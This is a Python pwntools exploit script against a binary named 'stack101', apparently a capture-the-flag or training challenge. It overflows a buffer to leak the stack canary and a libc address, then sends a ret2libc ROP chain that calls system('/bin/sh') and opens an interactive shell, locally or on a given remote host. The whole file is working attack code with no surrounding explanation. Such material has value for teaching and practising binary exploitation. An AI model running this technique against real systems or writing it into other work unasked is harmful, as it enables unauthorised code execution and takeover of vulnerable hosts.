#!/usr/bin/python3

from pwn import *
from sys import argv

if len(argv) != 3:
    hostname = "localhost"
    port = 1337
else:
    hostname = argv[1]
    port = int(argv[2])

elf = ELF('./stack101')
libc = ELF('./libc.so.6')

REMOTE = False
DEBUG = not REMOTE

context.arch = 'amd64'
context.terminal = ['gnome-terminal', '--title=GDB-Pwn', '-e']

def getPIEBase(proc):
    memory_map = open("/proc/{}/maps".format(proc.pid),"rb").readlines()
    return int(memory_map[0].split(b"-")[0],16)

if REMOTE:
    r = remote(hostname, port)
else:
    r = elf.process()

pld = 'A'*0x49

r.sendafter('overflows: ', pld)

canary = u64(r.recvuntil('.\n', drop=True).split(b'"')[1][len(pld):].rjust(8, b'\x00'))

log.success('canary: %s' % hex(canary))

r.sendafter('y/n) ', 'n')

pld += 'A'*15

r.sendafter('overflows: ', pld)

libc_base = u64(r.recvuntil('.\n', drop=True).split(b'"')[1][len(pld):].ljust(8, b'\x00')) - 0x240b3

log.success('libc_base: %s' % hex(libc_base))

system_addr = libc_base + libc.sym['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
pop_rdi = libc_base + 0x0000000000023b72

r.sendafter('y/n) ', 'n')

pld = b'A'*0x48
pld += p64(canary)
pld += p64(0x0)
pld += p64(pop_rdi + 1) # ret
pld += p64(pop_rdi)
pld += p64(binsh_addr)
pld += p64(system_addr)

# The ret gadget is actually used used to align the stack, and avoid system causing SEGFAULT
# https://stackoverflow.com/questions/54393105/libcs-system-when-the-stack-pointer-is-not-16-padded-causes-segmentation-faul

r.sendafter('overflows: ', pld)
r.sendafter('y/n) ', 'y')

r.interactive()